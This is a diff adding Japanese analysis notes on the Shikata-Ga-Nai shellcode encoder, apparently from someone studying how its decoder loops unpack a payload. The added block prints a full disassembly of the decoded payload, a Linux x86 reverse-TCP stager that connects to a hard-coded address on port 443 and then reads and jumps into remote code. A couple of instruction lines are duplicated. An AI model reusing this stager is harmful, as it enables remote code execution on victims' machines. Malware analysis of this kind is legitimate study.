@@ -68,6 +68,159 @@ eax            0x56556000          1448435712
 - termina addrsee : 0x80481ab
 - ```0x0804807f```のdestinationが```DWORD PTR [esi+0x13]```になっている場合はデコードに失敗している。
 - 以降複数回のデコードが発生する
+- after deployment
+```
+   0x08048054:	mov    edx,0xa7bc0447
+   0x08048059:	fcmove st,st(4)
+   0x0804805b:	fnstenv [esp-0xc]
+   0x0804805f:	pop    eax
+   0x08048060:	sub    ecx,ecx
+   0x08048062:	mov    cl,0x51
+   0x08048064:	xor    DWORD PTR [eax+0x12],edx
+   0x08048067:	add    eax,0x4
+   0x0804806a:	add    edx,DWORD PTR [eax+0xe]
+   0x0804806d:	loop   0x8048064
+   0x0804806f:	mov    edi,0xb683237
+   0x08048074:	fcmovnb st,st(3)
+   0x08048076:	fnstenv [esp-0xc]
+   0x0804807a:	pop    eax
+   0x0804807b:	xor    ecx,ecx
+   0x0804807d:	mov    cl,0x4a
+   0x0804807f:	xor    DWORD PTR [eax+0x13],edi
+   0x08048082:	sub    eax,0xfffffffc
+   0x08048085:	add    edi,DWORD PTR [eax+0xf]
+   0x08048088:	loop   0x804807f
+   0x0804808a:	fcmovne st,st(3)
+   0x0804808c:	mov    edx,0x6af194e5
+   0x08048091:	fnstenv [esp-0xc]
+   0x08048095:	pop    ebp
+   0x08048096:	xor    ecx,ecx
+   0x08048098:	mov    cl,0x43
+   0x0804809a:	xor    DWORD PTR [ebp+0x19],edx
+   0x0804809d:	add    edx,DWORD PTR [ebp+0x19]
+   0x080480a0:	sub    ebp,0xfffffffc
+   0x080480a3:	loop   0x804809a
+   0x080480a5:	mov    eax,0x1068a5e8
+   0x080480aa:	fcmovne st,st(7)
+   0x080480ac:	fnstenv [esp-0xc]
+   0x080480b0:	pop    ebx
+   0x080480b1:	xor    ecx,ecx
+   0x080480b3:	mov    cl,0x3c
+   0x080480b5:	add    ebx,0x4
+   0x080480b8:	xor    DWORD PTR [ebx+0x11],eax
+   0x080480bb:	add    eax,DWORD PTR [ebx+0x11]
+   0x080480be:	loop   0x80480b5
+   0x080480c0:	mov    edx,0xfd3089b0
+   0x080480c5:	fcmovnb st,st(4)
+   0x080480c7:	fnstenv [esp-0xc]
+   0x080480cb:	pop    esi
+   0x080480cc:	sub    ecx,ecx
+   0x080480ce:	mov    cl,0x36
+   0x080480d0:	add    esi,0x4
+   0x080480d3:	xor    DWORD PTR [esi+0xe],edx
+   0x080480d6:	add    edx,DWORD PTR [esi+0xe]
+   0x080480d9:	loop   0x80480d0
+   0x080480db:	mov    esi,0x35c3c885
+   0x080480e0:	fincstp 
+   0x080480e2:	fnstenv [esp-0xc]
+   0x080480e6:	pop    edx
+   0x080480e7:	xor    ecx,ecx
+   0x080480e9:	mov    cl,0x2f
+   0x080480eb:	xor    DWORD PTR [edx+0x13],esi
+   0x080480ee:	add    esi,DWORD PTR [edx+0x13]
+   0x080480f1:	sub    edx,0xfffffffc
+   0x080480f4:	loop   0x80480eb
+   0x080480f6:	mov    eax,0x59a96d9c
+   0x080480fb:	fcmovnbe st,st(5)
+   0x080480fd:	fnstenv [esp-0xc]
+   0x08048101:	pop    ebp
+   0x08048102:	xor    ecx,ecx
+   0x08048104:	mov    cl,0x28
+   0x08048104:	mov    cl,0x28
+   0x08048106:	add    ebp,0x4
+   0x08048109:	xor    DWORD PTR [ebp+0x10],eax
+   0x0804810c:	add    eax,DWORD PTR [ebp+0x10]
+   0x0804810f:	loop   0x8048106
+   0x08048111:	push   0x2
+   0x08048113:	pop    eax
+   0x08048114:	int    0x80
+   0x08048116:	test   eax,eax
+   0x08048118:	je     0x8048120
+   0x0804811a:	xor    eax,eax
+   0x0804811c:	mov    al,0x1
+   0x0804811e:	int    0x80
+   0x08048120:	mov    al,0x42
+   0x08048122:	int    0x80
+   0x08048122:	int    0x80
+   0x08048124:	push   0x2
+   0x08048126:	pop    eax
+   0x08048127:	int    0x80
+   0x08048129:	test   eax,eax
+   0x0804812b:	jne    0x804811a
+   0x0804812d:	push   0xa
+   0x0804812f:	pop    esi
+   0x08048130:	xor    ebx,ebx
+   0x08048132:	mul    ebx
+   0x08048134:	push   ebx
+   0x08048135:	inc    ebx
+   0x08048136:	push   ebx
+   0x08048137:	push   0x2
+   0x08048139:	mov    al,0x66
+   0x0804813b:	mov    ecx,esp
+   0x0804813d:	int    0x80
+   0x0804813f:	xchg   edi,eax
+   0x08048140:	pop    ebx
+   0x08048141:	push   0x71365f8d
+   0x08048146:	push   0xbb010002
+   0x0804814b:	mov    ecx,esp
+   0x0804814d:	push   0x66
+   0x0804814f:	pop    eax
+   0x08048150:	push   eax
+   0x08048151:	push   ecx
+   0x08048152:	push   edi
+   0x08048153:	mov    ecx,esp
+   0x08048155:	inc    ebx
+   0x08048156:	int    0x80
+   0x08048158:	test   eax,eax
+   0x0804815a:	jns    0x8048175
+   0x0804815c:	dec    esi
+   0x0804815d:	je     0x804819c
+   0x0804815f:	push   0xa2
+   0x08048164:	pop    eax
+   0x08048165:	push   0x0
+   0x08048167:	push   0x5
+   0x08048169:	mov    ebx,esp
+   0x0804816b:	xor    ecx,ecx
+   0x0804816d:	int    0x80
+   0x0804816f:	test   eax,eax
+   0x08048171:	jns    0x8048130
+   0x08048173:	jmp    0x804819c
+   0x08048175:	mov    dl,0x7
+   0x08048177:	mov    ecx,0x1000
+   0x0804817c:	mov    ebx,esp
+   0x0804817e:	shr    ebx,0xc
+   0x08048181:	shl    ebx,0xc
+   0x08048184:	mov    al,0x7d
+   0x08048186:	int    0x80
+   0x08048188:	test   eax,eax
+   0x0804818a:	js     0x804819c
+   0x0804818c:	pop    ebx
+   0x0804818d:	mov    ecx,esp
+   0x0804818f:	cdq    
+   0x08048190:	mov    dl,0x6a
+   0x08048192:	mov    al,0x3
+   0x08048194:	int    0x80
+   0x08048196:	test   eax,eax
+   0x08048198:	js     0x804819c
+   0x0804819a:	jmp    ecx
+   0x0804819c:	mov    eax,0x1
+   0x080481a1:	mov    ebx,0x1
+   0x080481a6:	int    0x80
+   0x080481a8:	xor    ebx,ebx
+   0x080481aa:	push   0x1
+   0x080481ac:	pop    eax
+   0x080481ad:	int    0x80
+```
 ## その他のアイディア
 ```Shikata-Ga-Nai```エンコーダの背景知識
 ### FPU命令
